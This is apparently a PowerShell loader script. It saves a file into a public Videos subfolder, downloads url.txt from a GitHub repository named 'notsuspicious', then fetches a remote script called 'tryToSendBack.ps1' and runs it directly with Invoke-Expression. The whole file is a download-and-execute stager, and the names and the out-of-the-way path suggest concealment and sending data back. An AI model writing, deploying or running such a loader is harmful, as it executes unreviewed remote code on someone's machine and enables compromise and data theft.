$urlFilePath = 'C:\Users\Public\Videos\GraphicalUserInterface\url.txt'

try {
    # Check if url.txt file already exists
    if (-not (Test-Path $urlFilePath)) {
        # Download url.txt if it doesn't exist
        Invoke-WebRequest 'https://github.com/RaupenInspektor/notsuspicious/raw/main/url.txt' -OutFile $urlFilePath
    }

    # Execute the tryToSendBack.ps1 script content
    $scriptContent = (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/tryToSendBack.ps1" -UseBasicParsing).Content
    Invoke-Expression -Command $scriptContent
}
catch {
    # Handle exceptions here
    Write-Host "An error occurred: $_"
}
